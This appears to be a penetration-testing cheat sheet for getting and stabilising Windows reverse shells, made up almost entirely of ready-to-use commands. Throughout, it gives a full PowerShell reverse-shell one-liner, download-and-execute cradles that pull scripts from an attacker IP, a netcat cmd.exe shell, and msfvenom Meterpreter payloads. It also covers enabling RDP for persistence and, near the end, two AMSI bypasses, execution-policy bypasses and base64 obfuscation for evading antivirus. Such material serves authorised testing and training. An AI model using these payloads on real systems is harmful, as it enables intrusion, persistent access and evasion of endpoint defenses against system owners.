# Windows Shell Upgrade and Stabilization

Upgrade basic Windows reverse shells to fully interactive ConPTY shells with proper terminal emulation.
ConPTY provides a native Windows pseudo-console for better shell interaction and stability.

## Quick Reference

```powershell
# ConPTY shell (best method)
IEX(IWR http://10.10.10.10:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing)

# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## ConPTY Shell (Recommended)

### Setup

```bash
# 1. Host Invoke-ConPtyShell.ps1
python3 -m http.server 8000

# 2. Edit script with your IP and port
# Or use inline execution
```

### Attacker Listener

```bash
# Prepare terminal
stty raw -echo; (stty size; cat) | nc -lvnp 4444
```

### Victim Execution

```powershell
# Basic execution
IEX(IWR http://10.10.10.10:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing)

# With PowerShell wrapper
powershell.exe IEX(IWR http://10.10.10.10:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing)

# From cmd.exe
cmd.exe /c powershell.exe IEX(IWR http://10.10.10.10:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing)

# With different quotes
cmd.exe /c "powershell.exe IEX(IWR http://10.10.10.10:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing)"

# Download and execute separately
Invoke-WebRequest http://10.10.10.10:8000/Invoke-ConPtyShell.ps1 -OutFile C:\Windows\Temp\shell.ps1
C:\Windows\Temp\shell.ps1
```

### Base64 Encoded Execution

```bash
# Generate base64 payload
printf "IWR 'http://10.10.10.10:8000/Invoke-ConPtyShell.ps1' -UseBasicParsing | IEX" | iconv -t utf-16le | base64 -w 0

# Execute on victim
powershell -enc <base64_payload>
```

## PowerShell Reverse Shells

### One-Liner

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Nishang Reverse Shell

```powershell
# Download Invoke-PowerShellTcp.ps1
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444
```

## CMD Reverse Shells

```cmd
# Netcat (if available)
nc.exe -e cmd.exe 10.10.10.10 4444

# PowerShell from CMD
cmd.exe /c powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);..."
```

## Metasploit Payloads

```bash
# Generate Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f psh -o shell.ps1

# Handler
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

## Enable RDP for Persistence

```cmd
# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Allow through firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Connect
xfreerdp /u:username /p:password /v:10.10.10.10
```

## File Transfer Methods

```powershell
# Download file
Invoke-WebRequest http://10.10.10.10:8000/file.exe -OutFile C:\Windows\Temp\file.exe
IWR http://10.10.10.10:8000/file.exe -OutFile C:\Windows\Temp\file.exe

# Using certutil
certutil -urlcache -f http://10.10.10.10:8000/file.exe C:\Windows\Temp\file.exe

# Using bitsadmin
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10:8000/file.exe C:\Windows\Temp\file.exe

# PowerShell download and execute
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/script.ps1')
```

## Common Workflow

```bash
# Step 1: Set up web server
python3 -m http.server 8000

# Step 2: Prepare ConPTY listener
stty raw -echo; (stty size; cat) | nc -lvnp 4444

# Step 3: Execute on victim
# powershell.exe IEX(IWR http://10.10.10.10:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing)

# Step 4: Verify full terminal
# - Test Ctrl+C
# - Test tab completion
# - Test command history
```

## Troubleshooting

### ConPTY Not Working

```powershell
# Check PowerShell version
$PSVersionTable.PSVersion

# Try alternative download methods
(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/Invoke-ConPtyShell.ps1') | IEX

# Check execution policy
Get-ExecutionPolicy
Set-ExecutionPolicy Bypass -Scope Process
```

### Firewall Blocking Outbound

```powershell
# Check firewall rules
netsh advfirewall show allprofiles

# Try different ports (80, 443, 53, 8080)
# Use HTTPS if available
```

### AMSI Bypass

```powershell
# AMSI bypass (if needed)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

## Notes

**ConPTY Advantages:**

- Full terminal emulation
- Proper signal handling
- Tab completion
- Command history
- Works with interactive programs
- Native Windows pseudo-console

**ConPTY Requirements:**

- Windows 10 1809+ or Server 2019+
- PowerShell available
- Outbound network access

**Listener Setup:**

The `stty raw -echo` command is crucial:
- `raw`: Passes all input directly
- `-echo`: Prevents double echo
- Provides proper terminal emulation

**Pivoting Considerations:**

When pivoting through another host:
1. Host web server on pivot
2. Edit ConPtyShell.ps1 to connect to pivot
3. Set up port forwarding on pivot
4. Listener on attacker machine

**Alternative Tools:**

- **Empire/Starkiller**: C2 framework
- **Covenant**: .NET C2 framework
- **Sliver**: Modern C2 framework
- **Metasploit**: Meterpreter shells

**Execution Policy Bypass:**

```powershell
# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1

# From within PowerShell
Set-ExecutionPolicy Bypass -Scope Process
```

**Obfuscation:**

```powershell
# Base64 encode command
$command = 'IEX(IWR http://10.10.10.10:8000/shell.ps1 -UseBasicParsing)'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell -enc $encodedCommand
```

**Best Practices:**

- Use ConPTY for best experience
- Always test shell stability
- Have backup shell methods
- Consider AMSI/AV evasion
- Use HTTPS when possible
- Clean up artifacts after
- Document working payloads

**Common Issues:**

1. **AMSI blocking**: Use AMSI bypass
2. **Execution policy**: Use -ep bypass
3. **Firewall**: Try different ports
4. **AV detection**: Obfuscate payload
5. **Network restrictions**: Use allowed protocols
